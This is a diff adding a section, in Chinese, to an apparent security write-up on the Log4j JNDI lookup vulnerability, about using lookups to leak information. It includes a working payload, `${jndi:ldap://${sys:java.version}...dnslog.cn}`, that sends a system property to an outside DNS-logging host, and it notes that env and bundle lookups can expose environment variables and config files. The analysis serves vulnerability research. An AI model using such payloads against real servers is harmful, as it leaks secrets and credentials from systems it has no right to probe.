@@ -169,3 +169,44 @@ public static void main(String[] args) {
 
 ![image-20211211160626836](./images/image-20211211160626836.png)
 
+## 其他
+
+今天看到其他师傅发的利用，意识到能用lookup信息泄露，比如
+
+`${jndi:ldap://${sys:java.version}.7i3934.dnslog.cn:1099/}`
+
+![image-20211212215217436](log4j_RCE.assets/image-20211212215217436.png)
+
+还是这几个lookup实现
+
+![image-20211212215658902](log4j_RCE.assets/image-20211212215658902.png)
+
+比如sys
+
+SystemPropertiesLookup#lookup，就能从System.getProperties()中取值
+
+![image-20211212215815630](log4j_RCE.assets/image-20211212215815630.png)
+
+EnvironmentLookup#lookup是从System.getenv()取值
+
+![image-20211212220007210](log4j_RCE.assets/image-20211212220007210.png)
+
+JavaLookup#lookup局限这几个
+
+![image-20211212220152052](log4j_RCE.assets/image-20211212220152052.png)
+
+浅蓝师傅还发现了如果使用了ResourceBundleLookup#lookup，可以读取properties配置文件
+
+![image-20211212222047702](log4j_RCE.assets/image-20211212222047702.png)
+
+但是strLookupMap中没有bundle这个key，应该不能直接触发，除非开发人员直接使用并且参数可控
+
+`ResourceBundle.getBundle(bundleName).getString(bundleKey)`
+
+参考：
+
+https://xz.aliyun.com/t/10649
+
+https://github.com/apache/logging-log4j2/compare/log4j-2.15.0-rc1...log4j-2.15.0-rc2
+
+https://mp.weixin.qq.com/s/vAE89A5wKrc-YnvTr0qaNg
